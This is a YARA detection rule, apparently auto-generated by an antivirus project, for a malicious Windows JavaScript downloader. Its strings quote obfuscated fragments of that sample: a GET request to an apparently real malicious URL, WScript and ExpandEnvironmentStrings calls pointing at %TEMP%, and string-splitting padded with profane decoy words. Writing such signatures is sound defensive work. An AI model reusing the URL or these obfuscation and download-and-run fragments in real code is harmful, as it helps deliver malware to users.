rule sig_20160428_34679be7d762f1ac263c4a1df263f26a {
  meta:
    description = "datamaliciousorder - file 20160428_34679be7d762f1ac263c4a1df263f26a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "124755087fdaa47b17a1f1f61ee94b37c06a1fc1d3864d333b743b3b566a124b"

  strings:
    $s1  = "FhsRqkYvoEcsBrbHejKuu[RinKenWmhZhdNltTzfSmb](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "function PxzGlmDxrXhkEcpQovHqe(AubXrsCxuIrmIdoClxBvn){MssNmlEgxUynZzuXiiZum[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function PxzGlmDxrXhkEcpQovHqe(AubXrsCxuIrmIdoClxBvn){MssNmlEgxUynZzuXiiZum[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function BalRrmPefJyrJdqXipNbk() {return MssNmlEgxUynZzuXiiZum[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "var MssNmlEgxUynZzuXiiZum = function DweCgfTntLdgMbvEduRtd() {return GazDegEszSacEoxGgnDjx[LjtAtxSdzMvdCqyTriElq](\"WScript\"+\"" ascii
    $s6  = "return KswUciHihKipSilOtyCyr - YxfPpnXxxDmtLbcWpgGfx;};" fullword ascii
    $s7  = "function VadTiwIryKkiFvzKouNhq(KswUciHihKipSilOtyCyr, YxfPpnXxxDmtLbcWpgGfx){YjtRrkKvxEvdCmcSdcXie = YjtRrkKvxEvdCmcSdcXie * 1; " ascii
    $s8  = "var GazDegEszSacEoxGgnDjx = this[\"WScript\"];" fullword ascii
    $s9  = "var MssNmlEgxUynZzuXiiZum = function DweCgfTntLdgMbvEduRtd() {return GazDegEszSacEoxGgnDjx[LjtAtxSdzMvdCqyTriElq](\"WScript\"+\"" ascii
    $s10 = "function BalRrmPefJyrJdqXipNbk() {return MssNmlEgxUynZzuXiiZum[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (FhsRqkYvoEcsBrbHejKuu[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function VadTiwIryKkiFvzKouNhq(KswUciHihKipSilOtyCyr, YxfPpnXxxDmtLbcWpgGfx){YjtRrkKvxEvdCmcSdcXie = YjtRrkKvxEvdCmcSdcXie * 1; " ascii
    $s13 = "function RqtQwhPprHyqGslIheRkh(){return WbnUrtKvqTlzCigVdzQnt + \"\";};" fullword ascii
    $s14 = "function QbiFhuBetDzxOxoQhqZhu() {return ((TwmErvPjfXbwQdcOexCmt == true) && (TwmErvPjfXbwQdcOexCmt == LdcQrhJwvEgeQbyJwtSnc)) ?" ascii
    $s15 = "function QbiFhuBetDzxOxoQhqZhu() {return ((TwmErvPjfXbwQdcOexCmt == true) && (TwmErvPjfXbwQdcOexCmt == LdcQrhJwvEgeQbyJwtSnc)) ?" ascii
    $s16 = "var TwmErvPjfXbwQdcOexCmt = false;" fullword ascii
    $s17 = "return VadTiwIryKkiFvzKouNhq(1 == 1 ? YvmJwaSkxFxtQgnYeyCsy : 0, 1 == 1 ? JqnValFeoCyuHhdTdoXdm : 0);" fullword ascii
    $s18 = "function HnqFuiVzcVkoLynMbfNiw(){return 23;};" fullword ascii
    $s19 = "function AqoXerBtsWixKlgPfuFsa()" fullword ascii
    $s20 = "var LdcQrhJwvEgeQbyJwtSnc = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}